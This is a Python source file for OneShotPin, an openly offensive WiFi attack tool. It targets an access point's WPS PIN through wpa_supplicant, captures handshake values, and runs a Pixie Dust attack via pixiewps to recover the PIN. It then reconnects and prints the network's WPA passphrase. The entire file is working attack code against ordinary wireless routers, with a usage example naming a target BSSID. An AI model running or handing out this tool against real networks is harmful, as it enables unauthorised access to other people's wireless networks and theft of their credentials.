#!/usr/bin/env python3

import sys
import subprocess
import os
import tempfile
import shutil


class Data():
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''
        self.wpa_psk = ''
        self.state = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return self.pke and self.pkr and self.e_nonce and self.authkey and self.e_hash1 and self.e_hash2

    def get_pixie_cmd(self, full_range=False):
        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(
            self.pke, data.pkr, self.e_hash1, self.e_hash2, self.authkey, self.e_nonce)
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd

class Options():
    def __init__(self):
        self.interface = None
        self.bssid = None
        self.pin = None
        self.essid = None
        self.pixiemode = False
        self.full_range = False
        self.showpixiecmd = False
        self.verbose = False


def shellcmd(cmd):
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, encoding='utf-8')
    result = proc.stdout.read()
    proc.wait()
    return result


def recvuntil(pipe, what):
    s = ''
    while True:
        inp = pipe.stdout.read(1)
        if inp == '':
            return s
        s += inp
        if what in s:
            return s


def run_wpa_supplicant(options):
    options.tempdir = tempfile.mkdtemp()
    with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
        temp.write("ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n".format(options.tempdir))
        options.tempconf = temp.name
    cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(options.interface, options.tempconf)
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8')
    return proc


def run_wpa_cli(options):
    cmd = 'wpa_cli -i{} -p{}'.format(options.interface, options.tempdir)
    proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, encoding='utf-8')
    recvuntil(proc, '\n>')
    return proc


def wps_reg(options):
    cmd = 'wpa_cli -i{} -p{}'.format(options.interface, options.tempdir)
    command = 'wps_reg {} {}\nquit\n'.format(options.bssid, options.pin)
    proc = subprocess.run(cmd, shell=True, input=command, stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT, encoding='utf-8')
    status = False
    if 'OK' in proc.stdout:
        status = True
    return status


def statechange(data, old, new):
    data.state = new
    return True


def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


def process_wpa_supplicant(pipe, options, data):
    line = pipe.stdout.readline()
    if line == '':
        pipe.wait()
        return False
    line = line.rstrip('\n')

    if options.verbose: sys.stderr.write(line + '\n')

    if line.startswith('WPS: '):
        if 'Building Message M' in line:
            statechange(data, data.state, 'M' + line.split('Building Message M')[1])
            print('[*] Sending WPS Message {}...'.format(data.state))
        elif 'Received M' in line:
            statechange(data, data.state, 'M' + line.split('Received M')[1])
            print('[*] Received WPS Message {}'.format(data.state))
        elif 'Received WSC_NACK' in line:
            statechange(data, data.state, 'WSC_NACK')
            print('[*] Received WSC NACK')
        elif 'Enrollee Nonce' in line and 'hexdump' in line:
            data.e_nonce = get_hex(line)
            assert(len(data.e_nonce) == 16*2)
            if options.pixiemode: print('[P] E-Nonce: {}'.format(data.e_nonce))
        elif 'DH own Public Key' in line and 'hexdump' in line:
            data.pkr = get_hex(line)
            assert(len(data.pkr) == 192*2)
            if options.pixiemode: print('[P] PKR: {}'.format(data.pkr))
        elif 'DH peer Public Key' in line and 'hexdump' in line:
            data.pke = get_hex(line)
            assert(len(data.pke) == 192*2)
            if options.pixiemode: print('[P] PKE: {}'.format(data.pke))
        elif 'AuthKey' in line and 'hexdump' in line:
            data.authkey = get_hex(line)
            assert(len(data.authkey) == 32*2)
            if options.pixiemode: print('[P] AuthKey: {}'.format(data.authkey))
        elif 'E-Hash1' in line and 'hexdump' in line:
            data.e_hash1 = get_hex(line)
            assert(len(data.e_hash1) == 32*2)
            if options.pixiemode: print('[P] E-Hash1: {}'.format(data.e_hash1))
        elif 'E-Hash2' in line and 'hexdump' in line:
            data.e_hash2 = get_hex(line)
            assert(len(data.e_hash2) == 32*2)
            if options.pixiemode: print('[P] E-Hash2: {}'.format(data.e_hash2))
        elif 'Network Key' in line and 'hexdump' in line:
            data.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8')
            statechange(data, data.state, 'GOT_PSK')

    elif ': State: ' in line:
        statechange(data, *line.split(': State: ')[1].split(' -> '))
        if '-> SCANNING' in line:
            print('[*] Scanning...')
    elif 'WPS-FAIL' in line:
        statechange(data, data.state, 'WPS-FAIL')
    elif 'NL80211_CMD_DEL_STATION' in line:
        #if data.state == 'ASSOCIATED':
        #   print "URGH"
        print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
        #return False
    elif 'Trying to authenticate with' in line:
        if 'SSID' in line: options.essid = line.split("'")[1].replace(r'\xc2\xa0', ' ')
        print('[*] Authenticating...')
    elif 'Authentication response' in line:
        print('[+] Authenticated')
    elif 'Trying to associate with' in line:
        if 'SSID' in line: options.essid = line.split("'")[1].replace(r'\xc2\xa0', ' ')
        print('[*] Associating with AP...')
    elif 'Associated with' in line and options.interface in line:
        if options.essid:
            print('[+] Associated with {} (ESSID: {})'.format(options.bssid, options.essid))
        else:
            print('[+] Associated with {}'.format(options.bssid))
    elif 'EAPOL: txStart' in line:
        statechange(data, data.state, 'EAPOL Start')
        print('[*] Sending EAPOL Start...')
    elif 'EAP entering state IDENTITY' in line:
        print('[*] Received Identity Request')
    elif 'using real identity' in line:
        print('[*] Sending Identity Response...')

    return True


def poll_wpa_supplicant(wpas, options, data):
    while True:
        res = process_wpa_supplicant(wpas, options, data)

        if not res:
            break
        if data.state == 'WSC_NACK':
            print('[-] Error: wrong PIN code')
            break
        elif data.state == 'GOT_PSK':
            break
        elif data.state == 'WPS-FAIL':
            print('[-] WPS-FAIL error')
            break
    if data.wpa_psk:
        return True
    if data.got_all():
        return True
    return False


def connect(options, data):
    print('[*] Running wpa_supplicant...')
    wpas = run_wpa_supplicant(options)

    try:
        while True:
            s = recvuntil(wpas, '\n')
            if options.verbose: sys.stderr.write(s)
            if 'update_config=1' in s:
                break
    except KeyboardInterrupt:
        print("\nAborting...")
        cleanup(wpas, options)
        sys.exit(1)

    print('[*] Trying PIN "{}"...'.format(options.pin))
    wps_reg(options)

    try:
        res = poll_wpa_supplicant(wpas, options, data)
    except KeyboardInterrupt:
        print("\nAborting...")
        cleanup(wpas, options)
        sys.exit(1)
    cleanup(wpas, options)
    return res


def parse_pixiewps(output):
    lines = output.splitlines()
    for line in lines:
        if ('[+]' in line) and ('WPS' in line):
            pin = line.split(':')[-1].strip()
            return pin
    return False


def die(msg):
    sys.stderr.write(msg + '\n')
    sys.exit(1)


def usage():
    die("""
OneShotPin 0.0.2 (c) 2017 rofl0r, moded by drygdryg

{} <arguments>

Required Arguments:
    -i, --interface=<wlan0>  : Name of the interface to use
    -b, --bssid=<mac>        : BSSID of the target AP

Optional Arguments:
    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
    -K, --pixie-dust         : Run Pixie Dust attack
    -F, --force              : Run Pixiewps with --force option (bruteforce full range)
    -X                       : Alway print Pixiewps command
    -v                       : Verbose output

Example:
    {} -i wlan0 -b 00:90:4C:C1:AC:21 -K
""".format(sys.argv[0], sys.argv[0]))


def cleanup(wpas, options):
    wpas.terminate()
    shutil.rmtree(options.tempdir, ignore_errors=True)
    os.remove(options.tempconf)


if __name__ == '__main__':
    options = Options()

    import getopt
    optlist, args = getopt.getopt(sys.argv[1:], ":e:i:b:p:XFKv", ["help", "interface", "bssid", "pin", "force", "pixie-dust"])
    for a, b in optlist:
        if a in ('-i', "--interface"): options.interface = b
        elif a in ('-b', "--bssid"): options.bssid = b.upper()
        elif a in ('-p', "--pin"): options.pin = b
        elif a in ('-K', "--pixie-dust"): options.pixiemode = True
        elif a in ('-F', "--force"): options.full_range = True
        elif a in ('-X'): options.showpixiecmd = True
        elif a in ('-v'): options.verbose = True
        elif a == '--help': usage()
    if not options.interface or not options.bssid:
        die("Missing required argument! (use --help for usage)")
    if options.pin is None:
        if not options.pixiemode:
            die("You need to supply a pin or enable pixiemode (-K)! (use --help for usage)")
        else:
            options.pin = '12345670'

    if os.getuid() != 0:
        die("Run it as root")

    data = Data()

    connect(options, data)

    if data.wpa_psk:
        print("[+] WPS PIN: '{}'".format(options.pin))
        print("[+] WPA PSK: '{}'".format(data.wpa_psk))
        print("[+] AP SSID: '{}'".format(options.essid))
        sys.exit(0)

    elif data.got_all() and options.pixiemode:
        pixiecmd = data.get_pixie_cmd(options.full_range)
        print("Running Pixiewps...")
        if options.verbose or options.showpixiecmd: print("Cmd: {}".format(pixiecmd))
        out = shellcmd(pixiecmd)
        print(out)
        a = parse_pixiewps(out)
        if a and a != '<empty>':
            options.pin = a
            options.pixiemode = False
            data.clear()
            print('[+] Trying to get WPA PSK with the correct PIN...'.format(options.pin))

            connect(options, data)

            if data.wpa_psk:
                print("[+] WPS PIN: '{}'".format(options.pin))
                print("[+] WPA PSK: '{}'".format(data.wpa_psk))
                print("[+] AP SSID: '{}'".format(options.essid))
                sys.exit(0)
            sys.exit(1)
    elif options.pixiemode:
        print('[!] No enough data to run Pixie Dust attack')
        sys.exit(1)

    sys.exit(1)
